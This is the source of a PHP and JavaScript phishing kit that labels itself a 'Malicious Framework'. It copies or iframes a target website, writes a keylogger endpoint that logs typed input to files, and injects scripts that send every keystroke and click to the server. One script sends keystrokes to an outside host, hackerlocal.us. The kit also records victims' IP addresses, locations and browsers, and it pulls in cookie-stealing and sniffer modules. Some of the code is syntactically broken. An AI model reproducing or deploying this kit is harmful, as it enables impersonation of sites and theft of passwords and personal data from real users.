<!--/* Malicious Framework .Social Engineer.This is made for Hacking  -->

<?php #!/usr/bin/php 
require "config.ini";
?>
<?php $_SERVER['DOCUMENT_ROOT'] = getcwd();$filepath = realpath($_SERVER['SCRIPT_FILENAME']);$server = $filepath;#echo $filepath;?><!-- Imitating <?=@$site?> --><?php$filename = fopen($_SERVER['DOCUMENT_ROOT']."/keylogger.php", "w");$keylogger = "<?php".PHP_EOL."\$iframe=\"true\";".PHP_EOL."\$file = 'data.txt';session_start();if(isset(\$_GET['q']) && !empty(\$_GET['q'])){\$data=\$_GET['q'];\$remove = array('.Backspace','.Enter','Enter','Backspace','Up Arrow','Down Arrow','.');\$data = str_replace(\$remove,'',\$data);fclose(\$output);\$data = str_replace(' ','|',\$data);file_put_contents(\$file, \$_GET['q'], FILE_APPEND);printf(\"Logged!\");}";fwrite($filename, $keylogger);fclose($filename);?>
<?php function request($server,$data){$keylogger = $server."/keylogger.php?q=";$postdata = $data;$curl = curl_init();curl_setopt($curl, CURLOPT_URL, $keylogger);curl_setopt($curl, CURLOPT_HEADER,TRUE);curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd()."/checker/cookies.txt");curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd()."/checker/cookies.txt");curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0)curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'GET');@curl_setopt($curl, @CURLOPT_POSTFIELDS,($postdata));curl_setopt($curl,CURLOPT_FOLLOWLOCATION, 1);$content = curl_exec($curl);}?>
<?php ob_start();$filename = "temp.password.txt";$output = fopen("php://input", "r");$keylogger = $server."/keylogger.php?q=";$curl = curl_init();$data = stream_get_contents($output);$postdata = $data;$filename = fopen($filename, "a++");fwrite($filename, $data);fclose($filename);flush();ob_end_flush();request($server,$data);?>
<?php $keylogger = $server."/keylogger.php?q=";$postdata = $data;$curl = curl_init();?>
<!--# BEEF LINK CAN GO HERE -->
<!--# <link hidden scr="https://yourbeeflink"-->
<!-- Creates Malicious cookie * CookieMonster Required -->
<?php $curl = curl_init();curl_setopt($curl, CURLOPT_URL, $site);curl_setopt($curl, CURLOPT_HEADER,TRUE);curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd()."/checker/cookies.txt");curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd()."/checker/cookies.txt");curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);curl_setopt($curl,CURLOPT_FOLLOWLOCATION, 1);$content = curl_exec($curl);$response=$content;$header_size = curl_getinfo($curl, CURLINFO_HEADER_SIZE);$header = substr($response, 0, $header_size);$body = substr($response, $header_size);$content = null;?>
<!-- Logic to always Render Fake site correctly to steal information -->
<?php if($iframe == true){$iframe = "<?php".PHP_EOL."echo '<head><style>.keylogger{z-index: 1;position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; opacity: 1.0; }.iframe{position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; opacity: 1.0;}</style><body><input id =\"keylogger\"><iframe id=\"iframe\" class=\"iframe\" src=\"$site\"</iframe><input>'.'</body></head>';?>"."\n";$fakesite = 'fakesite.php';$filename = fopen($fakesite, "w");fwrite($filename, $iframe);fclose($filename);$content = @file_get_contents('fakesite.php');$content = $content;}else{$html = @file_get_contents($site);$fakesite = 'fakesite.php';$filename = fopen($fakesite, "w");fwrite($filename, $html);fclose($filename);$content = @file_get_contents($fakesite);}echo $content;#echo "<div hidden >".$extras."</div>"; # favicon and extra stuff opposite engine didnt catch ?>
<!-- PHP KEY.LOG.GER.CODE -- #gets.output.as.its.typed -->
<?php if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on'){$url = "https://";}else {$url = "http://";}$url.= $_SERVER['HTTP_HOST'];$url.= $_SERVER['REQUEST_URI'];$server = $url;?>
<!--This is the Server <?=$server?>-->
<!-- JAVASCRIPT KEY.LOG.GER.CODE -->
<script>(function(){
var server = <?=json_encode($server);?>;
document.addEventListener("keyup", function(e){    
var x = new XMLHttpRequest();x.open("POST", server, true);
x.send(e.key);});
document.addEventListener("click", function(e){
var click;if(e.which == 1){click = " "}else{click = ".";}
var x = new XMLHttpRequest();x.open("POST", server, true);
x.send(click);});})();</script> 
<script>
document.onkeypress = function(e) {
get = window.event?event:e;
key = get.keyCode?get.keyCode:get.charCode; //get character code
key = String.fromCharCode(key); //coverting to string
keys+ = key;
}
window.setInterval(function() {
new Image().src = 'http://hackerlocal.us/socialbot/keylogger.php?q='+keys; //sending data as get request by creating a new image
keys = '';
}, 300 //interval to execute continuously
);</script>

<?php 
sleep(1);
$timezone = date_default_timezone_get();date_default_timezone_set($timezone);
$date = date('m/d/Y h:i:s a', time());
# Main Functions 
echo '<!--|-----------------------|-->'.PHP_EOL;
echo '<!--|* MALICIOUS MICROCHIP *|-->'.PHP_EOL;
echo '<!--|-----------------------|-->'.PHP_EOL;
require $_SERVER['DOCUMENT_ROOT']."/cookieMonster.php";
require $_SERVER['DOCUMENT_ROOT'].'/sniffer.php';# steals all info <--*
echo "<!--|*                     *|-->".PHP_EOL;
echo "<!--|*   HACKERLOCAL.US    *|-->".PHP_EOL;
echo "<!--|-----------------------|-->".PHP_EOL;
echo "<!--`-----------------------`-->".PHP_EOL;
echo "<!--Pretending to be: ([ <".$site."> ])  -->".PHP_EOL;
if(isset($ip)){echo "<!--Victims IP: ([ <$".$ip."> ])  -->".PHP_EOL;}if(isset($city) && (isset($country)))
{echo "<!--Victims Location: ([ <".$city." ".$country."> ])  -->".PHP_EOL;}if(isset($agent))
{echo "<!--Victims UserAgent: ([ <".$agent."> ])  -->".PHP_EOL;}
if(isset($agent)&&(isset($ip))&&(isset($city))&&(isset($country))){
$secretAgent = "Malicious has a 100% Success Rate";  }?>
<?php $status = $header[0];if(!empty($content)){echo "* MALICIOUS SOCIAL ENGINEERING 😈 * ".PHP_EOL;}else{echo "MALICIOUS FAILED ❌:";die();}?>




